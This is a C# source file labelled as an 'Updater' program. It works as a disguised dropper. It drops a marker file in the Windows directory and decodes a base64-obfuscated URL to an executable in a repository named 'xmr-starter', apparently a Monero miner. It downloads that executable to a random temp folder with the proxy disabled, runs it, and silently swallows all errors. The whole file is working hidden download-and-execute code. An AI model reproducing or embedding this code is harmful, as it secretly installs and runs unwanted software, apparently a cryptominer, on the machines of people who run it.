using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Updater
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string mutexName = "nddi.bin";
                string file = Path.Combine(Environment.GetEnvironmentVariable("windir"), mutexName);

                if(File.Exists(file))
                {
                    if((DateTime.Now - File.GetLastAccessTime(file)).Days > 5)
                    {
                        File.Delete(file);
                    }
                }

                if (!File.Exists(file))
                {
                    Stream s = File.Create(file);
                    s.Close();

                    string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

                    if (!Directory.Exists(tempDirectory))
                    {
                        Directory.CreateDirectory(tempDirectory);
                    }

                    string tmpExePath = Path.Combine(tempDirectory, "nddi.exe");
                    string url = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL25zbHl0aGUveG1yLXN0YXJ0ZXIvcmVsZWFzZXMvZG93bmxvYWQvTEFURVNUL25kZGkuZXhl"));

                    ServicePointManager.DefaultConnectionLimit = 100;
                    WebRequest.DefaultWebProxy = null;

                    WebClient client = new WebClient();
                    client.Proxy = null;
                    client.DownloadFile(url, tmpExePath);

                    Process ExternalProcess = new Process();
                    ExternalProcess.StartInfo.FileName = tmpExePath;
                    ExternalProcess.StartInfo.CreateNoWindow = false;
                    ExternalProcess.StartInfo.UseShellExecute = false;
                    ExternalProcess.Start();
                }
            }
            catch
            { }
        }
    }
}
